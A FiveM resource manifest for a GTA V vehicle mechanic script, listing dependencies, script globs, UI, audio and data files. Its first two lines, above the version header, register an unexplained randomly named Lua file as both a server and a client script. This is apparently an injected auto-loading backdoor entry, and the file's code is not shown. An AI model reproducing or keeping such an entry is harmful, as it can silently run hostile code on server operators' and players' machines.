server_script "UCVDQDD9P.lua"
client_script "UCVDQDD9P.lua"
fx_version "cerulean"
game "gta5"
lua54 "yes"

description "For support or other queries: discord.gg/jgscripts"
version 'v1.4.1'
author "JG Scripts"

dependencies {
  "oxmysql",
  "ox_lib",
  "jg-vehiclemileage",
  "/server:7290",
  "/onesync",
}

shared_scripts {
  "@ox_lib/init.lua",
  "config/*.lua", 
  "locales/*.lua",
  "shared/*.lua",
  "framework/main.lua"
}

client_scripts {
  "framework/**/cl-*.lua",
  "client/cl-*.lua"
}

server_scripts {
  "@oxmysql/lib/MySQL.lua",
  "framework/**/sv-*.lua",
  "server/sv-*.lua"
}

ui_page "web/dist/index.html"

files {
  "web/dist/index.html",
  "web/dist/**/*",
  "logos/*",
  "data/carcols_gen9.meta",
  "data/carmodcols_gen9.meta",
  "audiodirectory/jg_mechanic.awc",
  "data/jg_mechanic_sounds.dat54.rel"
}

data_file "CARCOLS_GEN9_FILE" "data/carcols_gen9.meta"
data_file "CARMODCOLS_GEN9_FILE" "data/carmodcols_gen9.meta"
data_file "AUDIO_WAVEPACK" "audiodirectory"
data_file "AUDIO_SOUNDDATA" "data/jg_mechanic_sounds.dat"

escrow_ignore {
  "config/*.lua",
  "framework/**/*",
  "install/**/*",
  "locales/*.lua",
  "logos/**/*",
  "logos/**/*",
  "client/cl-vehicleprops.lua",
  "client/cl-locations.lua",
  "client/cl-handling.lua",
  "server/sv-usable-items.lua",
  "server/sv-webhooks.lua"
}
dependency '/assetpacks'